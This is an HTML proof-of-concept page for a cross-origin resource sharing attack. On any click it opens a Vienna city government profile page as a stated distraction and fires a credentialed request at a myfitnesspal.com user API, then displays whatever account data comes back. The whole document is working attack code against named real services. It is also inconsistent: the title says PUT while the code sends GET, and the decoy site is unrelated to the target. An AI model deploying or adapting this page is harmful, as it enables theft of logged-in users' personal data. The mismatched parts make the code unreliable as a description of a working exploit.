<!DOCTYPE html>
<html>
<head>
    <title>CORS PUT Exploit</title>
</head>
<body>
    <p>Click anywhere on this page to trigger the Cross-origin request.</p>
    <div id="response"></div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            let isAttacking = false;
            
            document.onclick = () => {
                if (isAttacking) return; 
                
                isAttacking = true;
                
                // Open target site in new tab (distraction)
                window.open('https://mein.wien.gv.at/Mein-Profil');
                
                // Execute CORS request
                makeCorsRequest();
            };
            
            function makeCorsRequest() {
                var xhttp = new XMLHttpRequest();
                
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4) {
                        console.log("Status:", this.status);
                        if (this.status == 200) {
                            console.log("Response:", this.responseText);
                            alert("Success! Response: " + this.responseText);
                            document.getElementById("response").innerHTML = this.responseText;
                        } else {
                            console.error("Error:", this.status, this.statusText);
                            alert("Error: " + this.status);
                        }
                    }
                };
                
                // Note: This will likely fail due to CORS policy
                // unless myfitnesspal.com has permissive CORS headers
                xhttp.open("GET", "https://www.myfitnesspal.com/api/services/users", true);
                xhttp.withCredentials = true;
                xhttp.send();
            }
        });
    </script>
</body>
</html>
